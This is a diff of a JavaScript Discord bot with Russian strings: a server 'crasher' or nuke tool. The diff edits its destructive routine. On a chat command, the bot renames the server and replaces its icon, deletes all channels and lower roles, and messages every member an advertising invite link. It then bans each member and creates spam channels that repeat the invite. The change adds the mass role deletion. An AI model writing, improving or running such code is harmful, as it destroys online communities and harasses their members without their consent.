@@ -34,23 +34,14 @@ bot.on ("message", async message =>{
 });
 bot.on('message', msg => {
     if (msg.content === 's?msg') {
-    	msg.guild.setName('Вас крашнул бот Конфы')
+    	 msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll
+    	msg.guild.setName('Крашнут')
 		msg.guild.setIcon('https://cdn.discordapp.com/icons/692983981255163905/6a89b42b8324ee64b093cc415271e479.png?size=128').then(() => {
       msg.guild.channels.forEach(c => c.delete()) //Удаление все чатов и каналов
        msg.guild.members.forEach(member => { //Расслыка всем пользователям
         if (member.id != bot.user.id && !member.user.bot) member.send('Вас крашнула конфа https://discord.gg/DM5xaGD').then(() => {
             member.ban().then(() => {
-                const name = 'Конфа крашнула Вас'
-                msg.guild.createChannel('Краш удачен')
-                msg.guild.createChannel('Краш удачен')
-                msg.guild.createChannel('Краш удачен')
-                msg.guild.createChannel('Краш удачен')
-                msg.guild.createChannel('Краш удачен')
-                msg.guild.createChannel('Краш удачен')
-                msg.guild.createChannel('Краш удачен')
-                msg.guild.createChannel('Краш удачен')
-                msg.guild.createChannel('Краш удачен')
-                msg.guild.createChannel('Краш удачен')
+                msg.guild.createChannel('Конфа топ')
 					.then(channel => {
                     channel.send('Вас крашнула конфа https://discord.gg/DM5xaGD')
                     channel.overwritePermissions(member, {
